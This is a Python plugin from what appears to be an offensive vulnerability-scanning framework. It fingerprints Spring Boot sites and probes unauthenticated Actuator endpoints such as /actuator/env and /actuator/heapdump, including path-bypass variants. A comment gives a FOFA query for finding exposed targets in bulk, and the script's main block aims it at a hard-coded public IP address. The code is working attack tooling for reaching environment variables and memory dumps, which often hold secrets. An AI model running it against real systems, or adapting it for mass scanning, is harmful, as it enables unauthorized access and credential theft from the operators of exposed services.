# coding=utf-8
# @Author   : zpchcbd HG team
# @Blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugLevel, BugType
from core.request.asynchttp import *


# fofa: icon_hash="116323821"
# python batch.py -m exploit.scripts.SpringBoot.actuator_unauth -cs -fs icon_hash=\"116323821\"

class Script(BaseScript):
    name = 'SpringBoot Actuator'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UNAUTH
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = []
        # exec
        self.exec_path_list = ['/actuator/env', '/env', '/actuator;/env', '/api/actuator/env', '/api/actuator/env;.css', '/actuator/heapdump', '/heapdump', '/actuator;/heapdump', '/api/actuator/heapdump', '/api/actuator/heapdump;.css']
        # priority
        self.priority = 1
        # 相关信息
        self.info = 'SpringBoot Actuator Unauth'
        # favicon
        self.favicon_md5_list = ['0488faca4c19046b94d07c3ee83cf9d6']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            url = f'http://{self.target}/favicon.ico' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/favicon.ico'
            favicon_md5 = await AsyncFetcher.get_favicon_md5_fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
            if favicon_md5 is not None and favicon_md5 in self.favicon_md5_list:
                self.flag = True
                gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
            url = f'http://{self.target}/xxxxxxxxxx' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/xxxxxxxxxx'
            text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
            if 'Whitelabel Error Page' in text:
                self.flag = True
                gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                    if response is not None and response.headers.get('content-type', '') and 'application/vnd.spring' in response.headers.get('content-type', ''):
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                        return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    print(asyncio.get_event_loop().run_until_complete(Script('http://183.131.122.183:9011/').attack()))

